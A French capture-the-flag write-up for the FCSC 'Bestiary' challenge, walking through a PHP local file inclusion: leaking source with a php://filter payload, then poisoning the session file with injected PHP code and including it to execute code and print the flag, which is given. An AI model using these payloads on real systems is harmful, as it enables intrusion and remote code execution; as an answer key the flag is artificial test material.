# Bestiary - 100 pts


# Énoncé 
> On vous demande simplement de trouver le flag.
>
>URL : http://challenges2.france-cybersecurity-challenge.fr:5004/
>
>Format du flag : FCSC{xxxx}
>

## Introduction

Ce challenge porte sur une faille de type LFI.


## Résolution

Dans un premier temps, regardons ce qu'il se passe sur la page web :

![bestiary](../images/Bestiary.jpg)

Nous avons une liste déroulante permettant de choisir un "monstre" et d'afficher sa description.

en essayant de lancer la requête **?monster=test** on se rend compte de ce qu'il se passe, il y a un include("test") qui se fait.

```
Warning: include("test"): failed to open stream: No such file or directory in /var/www/html/index.php on line 33

Warning: include(): Failed opening '"test"' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 33
```

Ayant déjà eu affaire à cette faille sur un autre challenge, j'ai pensé de suite à l'utilisation d'un PHP filter, pour récupérer le code source de la page (encodé en base 64) grâce à ce payload :

```
?monster=**php://filter/read=convert.base64-encode/resource=login.php**
```

Une fois décodé, on a le code suivant :

```
<?php
	**session_save_path("./sessions/")**;
	session_start();
	include_once(**'flag.php'**);
?>
[...]
<?php
	$monster = NULL;

	if(isset($_SESSION['monster']) && !empty($_SESSION['monster']))
		$monster = $_SESSION['monster'];
	if(isset($_GET['monster']) && !empty($_GET['monster']))
	{
		$monster = $_GET['monster'];
		$_SESSION['monster'] = $monster;
	}

	if($monster !== NULL && **strpos($monster, "flag") === False**)
		include($monster);
	else
		echo "Select a monster to read his description.";
?>
[...]

```

On remarque prémièrement qu'on a un fichier **flag.php**, on pourrait essayer de l'afficher de la même manière mais le soucis est qu'on a la fonction **strpos()** qui vérifie que la requête ne contient pas le mot "flag".

On voit également que PHP sauvegarde la session temporairement dans **"./sessions"**. Ce qui signifie que la dernière requête passée y est enregistrée.

Il nous suffit alors de récupérer notre cookie de session, ici **PHPSESSID=77a92d88fc8020c7059ac9c78243c53d**

Le dernier payload qu'on passe dans la requête se retrouve dans le fichier **./sessions/sess_77a92d88fc8020c7059ac9c78243c53d**

On comprend donc que pour récupérer le flag il va falloir réaliser 2 actions :

Premièrement, injecter dans l'URL la commande PHP voulue :

```
http://challenges2.france-cybersecurity-challenge.fr:5004/?monster=<?php include("fl"."ag.php"); echo $flag; ?>
```
Et enfin, inclure notre page de session, avec le code qu'on vient d'injecter qui va par conséquent être exécuté, et nous afficher le flag :

```
http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=./sessions/sess_77a92d88fc8020c7059ac9c78243c53d
```
**FLAG :  _FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}_**
